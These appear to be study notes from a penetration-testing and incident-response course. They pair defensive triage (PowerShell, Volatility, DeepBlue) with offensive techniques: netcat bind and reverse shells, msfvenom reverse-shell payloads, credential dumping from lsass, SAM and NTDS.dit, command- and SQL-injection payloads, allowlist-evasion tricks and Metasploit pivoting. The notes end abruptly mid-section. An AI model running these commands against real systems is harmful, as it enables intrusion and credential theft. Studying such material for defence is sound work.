# 1

## Incident response model

### Six-Step Incident Response Process: PICERL

1. Preparation
2. Identification
3. Containment
4. Eradication
5. Recovery
6. Lessons Learned

Common problems of PICERL

- Poor security hygiene (lack of visibility and
- threat intelligence)
- Little scoping (if any) leads to incomplete containment
- Not fixing the vulnerabilities
- Failure to apply lessons learned

### Dynamic Approach to Incident Response: DAIR

1. Prepare
2. Detect: EOI (Event of Interest), IOA (Indicator of Attack)
3. Verify, Triage: might lead to IOC (Indicator of Compromise)
4. CICLE: Scope --> Contain --> Eradicate (Undo the attacker's actions) --> Recover (Back to normal)
5. Debrief

## Powershell

### Get services for a host, listening on ports

```
PS C:\> Get-Process | Select-Object -First 1 *                     


Name                       : AggregatorHost
Id                         : 1144
PriorityClass              : Normal
FileVersion                : 10.0.26100.3624 (WinBuild.160101.0800)
HandleCount                : 143
...
Container                  :

PS C:\> Get-CimInstance -Class Win32_Process | Select-Object -First 3 ProcessId, ProcessName, CommandLine, ParentProcessId

ProcessId ProcessName         CommandLine ParentProcessId
--------- -----------         ----------- ---------------
        0 System Idle Process                           0
        4 System                                        0
      140 Secure System                                 4

PS C:\> Get-NetTCPConnection -State Listen | Select-Object -First 3 -Property LocalAddress, LocalPort, OwningProcess 

LocalAddress LocalPort OwningProcess
------------ --------- -------------
::               49671          1128
::1              49670          7588
::               49669          7232

PS C:\> Get-NetTCPConnection | Select-Object local*,remote*,state,@{Name='Process';Expression={(Get-Process -Id $_.OwningProcess).ProcessName}} | Format-Table

LocalAddress LocalPort RemoteAddress RemotePort       State Process       
------------ --------- ------------- ----------       ----- -------
::               49671 ::                     0      Listen services
::1              49670 ::                     0      Listen jhi_service
::               49669 ::                     0      Listen spoolsv
::               49668 ::                     0      Listen svchost
::               49667 ::                     0      Listen svchost
```

### Servie Investigation

```
PS C:\> Get-CimInstance -ClassName Win32_Service | Select-Object -First 2 * | Format-List Name,Caption,Description,PathName


Name        : ALG
Caption     : Application Layer Gateway Service
Description : インターネット接続共有に使用する、サード パーティのプロトコル プラグイン用のサポートを提供します。PathName    : C:\WINDOWS\System32\alg.exe
```

### Registry Interogation

```
PS C:\> Get-ChildItem 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\"" | Select-Object PSChildName

PSChildName
-----------
AddressBook
...
{B95E117F-2411-41AD-A9A5-77511F3040E4}


PS C:\> Get-ItemProperty 'HKLM:Software\Microsoft\Windows\CurrentVersion\Run'


SecurityHealth              : C:\WINDOWS\system32\SecurityHealthSystray.exe
RtkAudUService              : "C:\WINDOWS\System32\DriverStore\FileRepository\realtekservice.inf_amd64_a42d9de41f05fa49\RtkAudUService64.exe" -background
egui                        : "C:\Program Files\ESET\ESET Security\ecmds.exe" /run /hide /proxy
Logitech Download Assistant : C:\Windows\system32\rundll32.exe C:\Windows\System32\LogiLDA.dll,LogiFetch
PSPath                      : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
PSParentPath                : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion
PSChildName                 : Run
PSDrive                     : HKLM
PSProvider                  : Microsoft.PowerShell.Core\Registry
```

### Unusual Accounts

```
PS C:\> Get-LocalUser | Where-Object { $_.Enabled -eq $True }

Name Enabled Description
---- ------- -----------
sqat True


PS C:\> Get-LocalGroupMember Administrators

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
ユーザー    82202001-NP\Administrator Local
ユーザー    82202001-NP\sqat          Local


PS C:\> Get-LocalGroup | Select-Object -First 1 *


Description     : VMware User Group
Name            : __vmware__
SID             : S-1-5-21-4092567976-269810716-2760018999-1003
PrincipalSource : Local
ObjectClass     : グループ
```

### Scheduled Tasks

```
PS C:\> Get-ScheduledTask *Onedrive* | Select-Object -Property TaskName

TaskName
--------
OneDrive Reporting Task-S-1-5-21-4092567976-269810716-2760018999-1001
OneDrive Standalone Update Task-S-1-5-21-1270127141-432312421-2650139308-500
OneDrive Standalone Update Task-S-1-5-21-4092567976-269810716-2760018999-1001
OneDrive Startup Task-S-1-5-21-4092567976-269810716-2760018999-1001

PS C:\> Export-ScheduledTask -TaskName "OneDrive Reporting Task-S-1-5-21-4092567976-269810716-2760018999-1001"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <URI>\OneDrive Reporting Task-S-1-5-21-4092567976-269810716-2760018999-1001</URI>
  </RegistrationInfo>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-21-4092567976-269810716-2760018999-1001</UserId>
      <LogonType>InteractiveToken</LogonType>
    </Principal>
  </Principals>
  <Settings>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT2H</ExecutionTimeLimit>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <RestartOnFailure>
      <Count>2</Count>
      <Interval>PT30M</Interval>
    </RestartOnFailure>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
  </Settings>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2025-04-16T23:03:12</StartBoundary>
      <Repetition>
        <Interval>P1D</Interval>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>%localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe</Command>
      <Arguments>/reporting</Arguments>
    </Exec>
  </Actions>
</Task>
PS C:\> Get-ScheduledTaskInfo -TaskName 'OneDrive Reporting Task-S-1-5-21-4092567976-269810716-2760018999-1001' | Select-Object LastRunTime

PS C:\> Get-ScheduledTaskInfo -TaskName 'OneDrive Reporting Task-S-1-5-21-4092567976-269810716-2760018999-1001' | Select-Object LastRunTime

LastRunTime        
-----------
2025/04/17 15:16:26
```

### Get Windows Event

```
PS C:\> $end = Get-Date 4/16/2025;
PS C:\> $start = Get-Date 4/15/2025;
PS C:\> Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime=$start; EndTime=$end;}


   ProviderName: Microsoft-Windows-Eventlog

TimeCreated                      Id LevelDisplayName Message
-----------                      -- ---------------- -------
2025/04/15 16:39:50            1100 情報             イベント ログ サービスがシャットダウンしました。

   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                      Id LevelDisplayName Message
-----------                      -- ---------------- -------
2025/04/15 16:39:50            4672 情報             新しいログオンに特権が割り当てられました。...
2025/04/15 16:39:50            4624 情報             アカウントが正常にログオンしました。...
2025/04/15 16:39:49            4647 情報             ユーザー開始のログオフ:...

PS C:\> Get-WinEvent -LogName Security | Where-Object -Property Id -EQ 4625 | Format-List -Property TimeCreated,Message


TimeCreated : 2025/04/17 22:04:58
Message     : アカウントがログオンに失敗しました。
              サブジェクト:
...
```

### File hash and strings

```
PS C:\> Get-FileHash .\DumpStack.log

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          A981D2E8EBDA6A41C87CC7E5EFA9746E4D6CB99D023CF456B8FC58422BC330C1       C:\DumpStack.log

PS C:\tools\sysinternals> strings FILE_PATH
```

in bash

```
$ strings file ; strings -e l file
```

- -e: ASCII only
- l: LE unicode strings only

## Packet capturing

```
tcpdump -i INTERFACE -w FILE_PATH
tcpdump -r FILE_PATH -n -A
```

- -i: interface to capture
- -w: writeout to the path
- -n: no resolve for port and host
- -A: show as ASCII

## BPF: Berkeley packet filters

```
dst host 192.168.1.0
src host 192.168.1
dst host 172.16
src host 10
host 192.168.1.0
host 192.168.1.0/24
src host 192.168.1/24

ether host <MAC>
ether src host <MAC>
ether dst host <MAC>

dst net 192.168.1.0
src net 192.168.1
dst net 172.16
src net 10
net 192.168.1.0
net 192.168.1.0/24
src net 192.168.1/24RunOnlyIfNetworkAvailable

dst net 192.168.1.0 mask 255.255.255.255 or dst net 192.168.1.0/24
src net 192.168.1 mask 255.255.255.0 or src net 192.168.1/24
dst net 172.16 mask 255.255.0.0 src net 10 mask 255.0.0.0

src port 443
dst port 20
port 80

ether proto 0x888e
ip proto 50

vlan 100 && vlan 200
vlan && vlan 300 && ip

mpls 100000 && mpls 1024
mpls && mpls 1024 && host 192.9.200.1
```

## Squid access.log

```
1583050850.951 185 192.168.42.109 TCP_MISS/200 1856 POST https://google.com - ORIGINAL_DST/172.217.11.163 text/xml
-------------- --- -------------- ------------ ---- ---- ------------------ - --------------------------- --------
UTC timestamp
               Duration
                   Client who accessed the proxy
                                  Result code of Proxy/HTTP status code
                                               Size of packet
                                                    Method
                                                         URL
                                                                            User agent
                                                                              Hierarchy code (description of how the request was handled)
                                                                                                          Content type
```

## Volatility

```
$ vol -q -f win10.0.22000.556.raw windows.pslist.PsList
Volatility 3 Framework 2.0.2
PID PPID ImageFileName CreateTime
4 0 System 2022-03-28 11:10:44.000000
344 4 smss.exe 2022-03-28 11:10:44.000000
640 564 lsass.exe 2022-03-28 11:10:52.000000
5248 640 nc.exe 2022-03-28 11:31:56.000000
```


| Volatility 3 Module | Capability |
| --- | --- |
| List DLLs for processes | windows.dlllist.DllList |
| List kernel modules | windows.driverscan.DriverScan |
| List environment variables | windows.envars.Envars |
| Scan for files | windows.filescan.FileScan |
| Carve out files | windows.dumpfiles.DumpFiles |
| Examine Windows version information | windows.info.Info |
| Retrieve password hashes | windows.hashdump.Hashdump |
| List privileges by process | windows.privileges.Privs |
| List registry hive offsets | windows.registry.hivelist.HiveList |
| Access keys with --offset | windows.registry.printkey.PrintKey |
| Enumerate programs run from the Start menu | windows.registry.userassist.UserAssist |
| List trusted certificates in Windows cert. store | windows.registry.certificates.Certificates |
| List service name, display name, and PID | windows.svcscan.SvcScan |


# 2

## nmap

### Scan type flag

| Type | Flag | Description |
| --- | --- | --- |
| Ping or ARP | -sn | No port scanning, ARP if on same LAN, ping if not |
| TCP connect | -sT | TCP connection established, default for non-root priv |
| TCP SYN | -sS | Send SYN, see the response, default for root priv |
| UDP | -sU | UDP port scanning (UNRELIABLE) |
| Version | -sV | Send active probes to determine the service running on the port |

SYN scanning, when `Open`

```
A ----SYN----> B
A <--SYN,ACK-- B
```

SYN scanning, when `Closed`

```
A ----SYN----> B
A <--RST,ACK-- B
```

### Host Discovery

```
sudo nmap -sn 192.168.1.1-254
```

### Output type

| Flag | Output formt |
| --- | --- |
| -oA FILE | XML, greppable, normal |
| -oG FILE | Greppable |
| -oX FILE | XML |
| -oN FILE | Normal |

### NSE

| NSE | Function |
| --- | --- |
| -sC | Use default scripts |
| --script all | Run all scripts (DoS like) |
| --script-updatedb | Update the NSE scripts |
| --script banner | Get the banner |
| --script-help "help*" | Get help for the matching scripts |
| --script "http*" | Run the matching script |

> `nmap --script snmp-sysdescr --script-args creds.snmp=admin example.com`


## Cloud

### IP List

- GCP: `wget -qO- https://www.gstatic.com/ipranges/cloud.json | jq '.prefixes[] | .ipv4Prefix' -r`
- AWS: `wget -qO- https://ip-ranges.amazonaws.com/ip-ranges.json | jq '.prefixes[] | .ip_prefix' -r`
- Azure: `wget https://www.microsoft.com/en-us/download/details.aspx?id=56519 && jq < ~/Downloads/ServiceTags_Public_*.json '.values | .[] | .properties.addressPrefixes | .[]' -r`

### massscan

```
masscan 218.223.4.0/24 -p 22,25,80,443,3389
```

### TLS-SCAN

```
./tls-scan -c 142.250.199.110 --port=443 --pretty
```

## SMB

### Command to List

```
Get-CimInstance -Class win32_share -ComputerName 192.168.171.176 -Credentials
```

```
net.exe view \\192.168.171.176 /all
```

#### Command to Control

```
PS C:\> Get-SmbSession

SessionId ClientComputerName ClientUserName NumOpens
--------- ------------------ -------------- --------
549755813893 10.10.75.1 SEC504STUDENT\sec504 1

PS C:\> Get-SmbSession | Select-Object ClientComputerName, Dialect, SecondsExists, SecondsIdle

ClientComputerName Dialect SecondsExists SecondsIdle
------------------ ------- ------------- -----------
10.10.75.1 3.1.1 8147 84

PS C:\> $Password = Read-Host -AsSecureString
***********

PS C:\> Set-LocalUser -Name sec504 -Password $Password
PS C:\> Close-SmbSession -ClientComputerName 10.10.75.1 -Force
```

### Tools

#### SMBeagle

https://github.com/punk-security/SMBeagle

```
smbeagle -c results.csv -n 192.168.1.0/24 -u ksmith -p Password123 -q
```

#### SmbClient

```
smbclient -L //192.168.99.10 -U ksmith -m SMB2
smbclient -L \\\\192.158.99.10 -U ksmith
smbclient //192.168.99.10/accounting -U ksmith -m SMB2
```

#### DeepBlue

```
PS C:\> DeepBlue.ps1
PS C:\> DeepBlue.ps1 Logfile.evtx
PS C:\> DeepBlue.ps1 -Log System
PS C:\> $credential = Get-Credential
PS C:\> DeepBlue.ps1 -Log System -Hostname DC1 -Credential $credential

PS C:\> .\DeepBlue.ps1 .\evtx\password-spray.evtx

PS C:\> .\DeepBlue.ps1 .\evtx\metasploit-psexec-native-target-security.evtx
```

### Command matrix

| Functionality | PowerShell | CMD |
| --- | --- | --- |
| View remote smb shares | `Get-WmiObject -Class win32_share ComputerName <SERVER_IP>` | `net view /all \\<SERVER_IP>` |
| View local smb shares | `Get-SMBShare` | `net share` |
| Connect SMB share | `New-SmbMapping -LocalPath X: -RemotePath \\<SERVER_IP>\<SHARE_NAME>` -UserName <USER> -Password <PASS> | `net use \\<SERVER_IP>\<SHARE_NAME>` |
| View Inbound connections | `Get-SMBSession` | `net session` |
| Drop Inbound connections | `Close-SMBSession` | `net session \\<SERVER_IP /del` |
| View Outbound SMB mapped connections | `Get-SMBMapping` | `net use` |
| Drop Outbound SMB mapped connections | `Remove-SMBMapping -Force` | `net use * /del` |

## netcat

### Connection

Server

```
netcat -l -p 8080
```

Client

```
netcat 10.0.0.1 8080
```

### Send files

#### Listener --> Client

Listener (sending to client)

```
cat file | netcat -l -p 2222
```

Client (received from server)

```
netcat 10.0.0.1 2222 > file
```

#### Client --> Server

Client (sending to listener)

```
cat file | netcat 10.0.0.1 2222
```

Listener (received from client)

```
netcat -l -p 2222 > file
```

### Port scanning

```
nc -v -w 3 (-p 80) -z <TARGET_IP> <START_PORT>-<END_PORT>
```

- `-z`: minimal data to send
- `-v`: tell us when connection is made (enables us to know the port is open or not)
- `-w 3`: no wait more than 3 seconds on EACH port
- `-p 80`: **LOCAL port** to connect to

### Backdoor

#### Normal shell listener

```
[Attakcer] --> |FW| --> [Victim]
  Client                 Listener
```

Listener (run on victim)

```
nc -l -p 8080 -e /bin/bash
```

Client (attacker)

```
nc 184.29.20.198 8080
ls
whoami
pwd
```

#### Reverse shell

```
[Attakcer] <--------- [Victim]
 Listener              Client
```

Lisntener (on attacker)

```
nc -l -p 9999 -e 
```

Client (on victim)

```
nc 38.201.128.1 9999 -e /bin/bash
```

### Relay

#### One-way: A to C

```
A 10.0.0.1 --> B 10.1.0.1 --> C 10.2.0.1
```

A

```
nc 10.1.0.1 8080
```

B

```
nc -l -p | nc 10.2.0.1 8888
```

C

```
nc -l -p 8888 -e /bin/bash
```

#### BiDirectional: A and C

```
A 10.0.0.1 <--> B 10.1.0.1 <--> C 10.2.0.1
```

A

```
nc 10.1.0.1 8080
```

B

```
mkfifo backpipe
nc -l -p 2222 < backpipe | nc 10.10.10.100 80 > backpipe
```

C

```
nc -l -p 8888 -e /bin/bash
```


# 3

## Legba

```
legba -U sec504 -P sec504 -T 10.10.75.1 ssh
 legba -U user_list.txt -P password_list.txt -T 10.10.75.1 ssh
```

## Password Cracking Techinques

1. Guessing password: Just use list (or called Dictionary Attack)
2. Password spray: Small number of attempt on each of many hosts to circumvent lockout
3. Brute force

## Hashing in Windows

### LANMAN Hashing

**Even if LANMAN hashing enabled on the host, by its nature, password that is equal or greater than 15 characters in length, will NOT be stored as LANMAN hashing**

0. Original: `BuDdy12&`
1. Convert To Upper case: `BUDDY12&`
2. Pad to 14 (characters): `BUDDY12&______` (pad with `\x00`)
3. Split into 2 of 7: `BUDDY12` + `&______`
4. DES Encryption for each: `2C42686862534AA4` + `A86FB73C70515BD7` (64 bit key is `KGS!@#$%` (8 bits for a character, 8 characters))

### NT Hashes

Significantly stronger than LANMAN but *salt is not used*

0. Original: `BuDdy12&`
1. Convert it into unicode: `B\x00u\x00D\x00d\x00y\x001\x002\x00&\x00`
2. Unicode to MD4 hash: `17a7afd733dda50143b242a2aad8f0f7`
3. Encrypt the hash with EC4 or AES-CBC-128 and store it in the SAM registry

### Get Domain Controller Hashes

By use of Directory domain services management utility `ntdsutil`, `NTDS.dit` can be gathered.

```
C:\Users\Administrator> ntdsutil
ntdsutil: activate instance ntds
Active instance set to "ntds".
ntdsutil: ifm
ifm: create full c:\ntds
...
Copying registry files...
Copying c:\ntds\registry\SYSTEM
Copying c:\ntds\registry\SECURITY
IFM media created successfully in c:\ntds
ifm: quit
ntdsutil: quit
```

NTDS.dit is the file that contains hashes but it is encrypted with SYSTEM hive. So make use of SYSTEM hive, decrypt the file and store hashes in plain text: [secretsdump.py](https://github.com/fortra/impacket)

```
$  secretsdump.py -system registry/SYSTEM -ntds Active\
Directory/ntds.dit LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Target system bootKey: 0x3b53edaa727f0bbbc56bed5beb9a9530
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 05b651dcf420b842402b9d3cf3508e6a
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c3db44d312f154d162607
ee52628ace3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:2a9fa667f0d1b99b758767e68ea4e
c52:::
...
```

#### Get Windows 10 Password Hashes: Use meterpreter

1. Spawn an initial process
2. Migrate the process into ones inside of lsass.exe
3. Dump hashes

```
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
meterpreter > ps -S lsass.exe
Process List
============
PID PPID Name Arch Session User Path
--- ---- ---- ---- ------- ---- ----
620 480 lsass.exe x64 0 NT AUTHORITY\SYSTEM
C:\Win...\System32\lsass.exe
meterpreter > migrate 620
[*] Migrating from 1248 to 620...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089
c0:::
susan:1000:aad3b435b51404eeaad3b435b51404ee:864d8a2947723c4264598997c1d67a83:::
Reads password hashes
```

or shorter version is:

```
meterpreter > migrate -N lsass.exe
```

#### Get Windows 10 Password Hashes: Use Mimikatz

Get SAM and SYSTEM

```
C:\Temp> reg save hklm\sam sam.hiv && reg save hklm\system system.hiv
C:\Temp> c:\tools\mimikatz\x64\mimikatz.exe "lsadump::sam /sam:sam.hiv
/system:system.hiv" "exit"
...
RID : 000003e8 (1000)
User : Sec504
Hash NTLM: 864d8a2947723c4264598997c1d67a83
```

#### Analyze Windows hash output from tools

```
<USERNAME>:<USERID>:<LANMAN>:<NTHASH>
```

```
bob:1001:2c42686862534aa4a86fb73c70515bd7:17a7afd733dda50143b242a2aad8f0f7::
tom:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::
```

- Empty LANMAN: `aad3b435b51404eeaad3b435b51404ee`
- Empty NTHASH: `31d6cfe0d16ae931b73c59d7e0c089c0`


> Am All Day Baffled (`aad3b`) By Difficult Choices For Encrypted Data (`31d6cfe0d`)


## Hashing in linux

- /etc/passwd: user names
- /etc/shadow: password hashes

```
<USERNAME>:$<HASHTYPE>$<SALT>$<ENCODED_HASH>
sec580:$1$5XEtFMh0$5t7Dwuf4pBFEbvtGCkQn90:17315:0:99999:7:::
```

| Indicator | Hash type |
| --- | --- |
| missing | DES |
| $1 | MD5 |
| $5 | SHA256 |
| $6 | SHA512 |
| $y | Yescrypt |


## Hashcat

### Mode and example

| Mode | Flag | Description |
| --- | --- | --- |
| Straight | -a 0 | Use dictionary file |
| Combinator | -a 1 | Generate candidate two words from two files |
| Brute-force | -a 3 | Normal brute-force |
| Hybrid: Wordlist + Mask | -a 6 | Append mask to each of wordlist |
| Hybrid: Mask + Wordlist | -a 7 | Prepend mask t oeach of wordlist |

```
hashcat -m 0 -a 0 a95c530a7af5f492a74499e70578d150 <WORDLIST_FILE>
hashcat -m 0 -a 0 hashlist.txt <WORDLIST_FILE>
hashcat -m 0 -a 1 hashlist.txt <WORDLIST_FILE_1> <WORDLIST_FILE_2>
hashcat -m 0 -a 3 a95c530a7af5f492a74499e70578d150 ?d?l?l?d
hashcat -m 0 -a 3 a95c530a7af5f492a74499e70578d150 -1  ?1?1?1?1
hashcat -m 0 -a 3 a95c530a7af5f492a74499e70578d150 -1 abcdefghijklmnopqrstuvwxyz -2 0123456789 ?1?1?2?2
hashcat -m 0 -a 3 a95c530a7af5f492a74499e70578d150 -1 ?l -2 ?d ?1?1?2?2
hashcat -m 0 -a 6 a95c530a7af5f492a74499e70578d150 <WORDLIST_FILE> ?d?d
hashcat -m 0 -a 7 a95c530a7af5f492a74499e70578d150 ?d?d <WORDLIST_FILE>
```

#### Get the hashtype for `-m`

```
hashcat --identify hashes.txt
```

#### Mask

| Marker | Char sequence |
| --- | --- |
| ?l | abcdefghijklmnopqrstuvwxyz |
| ?u | ABCDEFGHIJKLMNOPQRSTUVWXYZ |
| ?d | 0123456789 |
| ?s | <SYMBOL> |
| ?a | ?l?u?s?d |

#### Show cracked password history

Get a list of cracked hashes from a given file using potfile

```
$ hashcat -m 0 pass --show
861f194e9d6118f3d942a72be3e51749:1234test   <-- Cracked
$ hashcat -m 0 pass --left
60b725f10c9c85c70d97880dfe8191b3            <-- Uncracked
```

## Metasploit

- Exploit: taking advantage of known flaw
- Payload: The code attackers want to run
  - Bind shell to arbitrary port
  - Reverse shell
  - Windows VNC server (as a DLL, injected into a vuln process)
  - Create local admin user
  - Meterpreter (run inside a vuln process, completetly on memory, transported with TLS): for Windows
  - Msfvenom: Standalone payload
- Auxiliary: Scanning
- Post modules: priv esc, gather creds, ...


```
On attacker
sec504@slingshot:~$ msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86 --platform
windows LHOST=172.16.0.6 LPORT=4444 -o installer.exe
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
Saved as: installer.exe
sec504@slingshot:~$ file installer.exe
installer.exe: PE32 executable (GUI) Intel 80386, for MS Windows
sec504@slingshot:~$
sec504@slingshot:~$
sec504@slingshot:~$ msfconsole -qx "use exploit/multi/handler; set PAYLOAD
windows/meterpreter/reverse_tcp; set LPORT 4444; set LHOST 0.0.0.0; exploit"
[*] Starting persistent handler(s)...
```

## Web attacks

- drive-by attack: Attacker compromises a weak and legitimate website, users will access the website, and js will be kicked and important data is sent to attacker's server
- waterhole attack: the victims are targeted in drive-by attacks
- beef

# 4

## Web Application Attack

### Discover contents

- Forced browsing: To access, use predefined list of URI rather than follow links
- Insecure Direct Object Reference (IDOR): Predictable pattern in URI
- `robots.txt`: Cue to discover hidden directories
- ffuf: pretty fast enumeration tool

```
ffuf -w words.txt -u https://target.tgt/FUZZ
```

```
python dates.py | ffuf -w - -u https://target.tld/ticketsbyday?id=FUZZ
seq -w 0 999 | ffuf -w - -u https://example.com/FUZZ
```

### Command injections

| payload | description |
| --- | --- |
| -h | maybe help will apppear |
| PARAM; echo 1 | Unix only |
| echo 1\| | perl specific, when opening a file |
| PARAM \| echo 1 | run echo after initial command |
| PARAM \|\| echo 1 | Unix only, initial command returns non-zero, run echo |
| PARAM & echo 1 | Unix only, run inital command as a background task, and echo |
| PARAM && echo 1 | Unix only, initial command returns zero, run echo |
| $(echo 1) | Unix only, bash specific |
| \`echo 1\` | Unix only, generic process substitution |
| >(echo 1) | Unix only, run echo using substitution |

### XSS

- Type of XSS:
  - Stored: Attacker store script into the website, and victim visit the page and execute the script
  - Reflected: Attacker sends crafted URL to victim (phising email) and victim visit the legitimate site and execute the script
- What XSS can do
  - Password guessing attack to internal app
  - Add a web browser key stroke logger
  - Port scan internal server
  - Capture screen
  - Capture mic or webcam
  - Steal a credential for creating a fake login page
  - Redirect a form hosted by attacker
  - Deploy JS cryptominer
  - Steal a  cookie

### SQLinjection

```
f"SELECT filename FROM dropbox WHERE owner = '{}';".format(user_input)

--> blake' OR 'a'='a

SELECT filename FROM dropbox WHERE owner = 'blake' OR 'a'='a';
```

sqlmap

```
sqlmap -u 'http://www.rookaviary.com/email_search.php?search=Taylor'
sqlmap -u 'http://www.rookaviary.com/email_search.php?search=Taylor' --dbs
sqlmap -u 'http://www.rookaviary.com/email_search.php?search=Taylor' -D web_app --tables
sqlmap -u 'http://www.rookaviary.com/email_search.php?search=Taylor' -D web_app -T users --columns
sqlmap -u 'http://www.rookaviary.com/email_search.php?search=Taylor' -D web_app -T users --dump
sqlmap -u "https://example.com/login" --data="username=admin&password=1234"
```

### SSRF

Have the server facing the attacker access other web sites typically hidden by FW, or its local files such as `/etc/passwd`. Application local files are more interesting than OS files, such as config, /etc/environment, /proc/NNN/environ...

### IMDS: Instance MetaData Service

```
curl -s http://169.254.169.254/latest/dynamic/instance-identity/document 
{
  "accountId" : "171510992009",
  "architecture" : "x86_64",
  "availabilityZone" : "ap-northeast-1c",
  "billingProducts" : null,
  "devpayProductCodes" : null,
  "marketplaceProductCodes" : null,
  "imageId" : "ami-089636926219b141b",
  "instanceId" : "i-0c4863ffe6255dcfe",
  "instanceType" : "t3.nano",
  "kernelId" : null,
  "pendingTime" : "2025-05-20T15:03:58Z",
  "privateIp" : "10.0.0.77",
  "ramdiskId" : null,
  "region" : "ap-northeast-1",
  "version" : "2017-09-30"
}
```

## Insecure cloud storage

### Cloud Storage Access

- AWS: https://s3.amazonaws.com/BUCKETNAME
- GCP: https://www.googleapis.com/storage/v1/b/BUCKETNAME
- Azure: https://ACCOUNTNAME.blob.core.windows.net/CONTAINERNAME

# 5

## Post exploit

- Modifying existing tools to evade detection: change hex-level
- Make the malicious code look legitimate: obfuscation, wrapping (code porting), and encoding (base64)
- Disabling endpoint tools with privilege escalation attacks: Endpoint security resides on the 0 ring (kernel mode), users including local admin resides on the 3 ring (user mode)
- Modifying their tactics to use tools and techniques that achieve their goals but do not raise an alert indication

## Bring Your Own Vulnerable Driver

To gain access to kernel mode to disable endpoint security, install vulnerable Microsoft-signed driver brought by attacker. This signing process is not implemented with revocation but only with block rules.

## Prevent malicious app execution

- Vendor patching
- Application allowlists: such as `Windows AppLocker`, intercept the execution process before it
- Circumvent Application allowlists: `LOL`, such as:
  - `\procdump.exe -accepteula -ma lsass.exe lsass.dmp` rather than mimikatz.exe
  - `InstallUtil /U shellcode.exe` rather than `shellcode.exe`: AppLocker cannot see the process inside of InstallUtil where the program can run, uninstallation even if the app is actually installed, can kick malicious process

## Linux LOL

| target | command |
| --- | --- |
| What can I do with `sudo` | sudo -l |
| Are there uncommon SETUID files (anyone can execute the file with owner priv) | find / -perm -4000 -uid 0 |
| Is Netcat installed | which nc |
| Is Smbclient installed | which smbclient |
| Any passwords in shell history | find / -name "*history" |
| Any passwords in web files | grep -iR password /var/www |
| Any unprotected SSH keys? | cat /home/\*/.ssh/\* |

## Lateral Movement

### Meterpreter Pivoting

#### Forwarding

```
 [Attacker]     [Compromised]    [Target]
96.97.98.99 --> 10.10.10.11 --> 10.10.10.100
```

On 10.10.10.11, something like local port forwarding, `96.97.98.99:8000` --> `10.10.10.100:80`

```
meterpreter > portfwd add -l 8000 -r 10.10.10.100 -p 80
```

#### Routing

Telling Metasploit to use the session already established to the pivot point, as a gateway, to access whatever it specifies (i.e., 10.10.10.0/24).

```
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/smb/psexec) > route add 10.10.10.0/24 1
msf5 exploit(windows/smb/psexec) > set RHOST 10.10.10.100
msf5 exploit(windows/smb/psexec) > exploit
[*] Started reverse TCP handler on 10.10.10.100:4444
[*] 10.10.10.11:445 - Selecting PowerShell target
[*] 10.10.10.11:445 - Executing the payload...
[+] 10.10.10.11:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (180291 bytes) to 10.10.10.100
[*] Meterpreter session 2 opened (10.10.10.100:4444 -> 10.10.10.11:1622) at 2020-01-24 11:45:31 +0000
meterpreter >
```

#### Port scanning

After pivotting, we do recon 

```
meterpreter > run arp_scanner -r 10.10.10.0/24
[*] ARP Scanning 10.10.10.0/24
[*] IP: 10.10.10.1 MAC 00:50:56:c0:00:08
[*] IP: 10.10.10.11 MAC 00:0c:29:76:53:e7
[*] IP: 10.10.10.100 MAC 00:0c:29:76:8a:75
meterpreter > background
msf5 exploit(windows/smb/psexec) > route add 10.10.10.0/24 1
msf5 exploit(windows/smb/psexec) > use auxiliary/scanner/portscan/tcp
msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.10.10.1,11,100
msf5 auxiliary(scanner/portscan/tcp) > set PORTS 22,25,80,135,445,631
msf5 auxiliary(scanner/portscan/tcp) > run
[+] 10.10.10.1: - 10.10.10.1:22 - TCP OPEN
[*] 10.10.10.1,11,100: - Scanned 1 of 3 hosts (33% complete)
[+] 10.10.10.11: - 10.10.10.11:135 - TCP OPEN
[+] 10.10.10.11: - 10.10.10.11:445 - TCP OPEN
[*] 10.10.10.1,11,100: - Scanned 2 of 3 hosts (66% complete)
```

### Portforwarding

#### SSH for Linux

```
sec504@slingshot:~$ ssh -L 8000:10.10.10.100:80 victortimko@10.10.10.11
Password:
Last login: Fri Jan 24 07:25:00 2020 from 10.10.10.100
victim:~ $
```

#### netsh for Windows

```
